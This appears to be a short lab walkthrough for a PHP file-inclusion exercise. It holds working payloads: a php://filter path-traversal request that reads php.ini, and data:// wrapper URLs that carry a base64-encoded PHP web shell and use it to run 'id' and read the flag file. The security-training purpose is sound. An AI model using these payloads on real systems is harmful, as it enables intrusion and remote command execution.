# [PHP Wrappers](PHP%20Wrappers.md)
### Try to gain RCE using one of the PHP wrappers and read the flag at /

```shell
curl http://154.57.164.81:31093/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
```
![](Screenshot%202026-06-30%20at%2015.32.19.png)![](Screenshot%202026-06-30%20at%2015.33.10.png)

```shell
http://154.57.164.81:31093/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```
![](Screenshot%202026-06-30%20at%2015.36.27.png)

```url
http://154.57.164.81:31093/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=cat%20/37809e2f8952f06139011994726d9ef1.txt
```
![](Screenshot%202026-06-30%20at%2015.43.48.png)
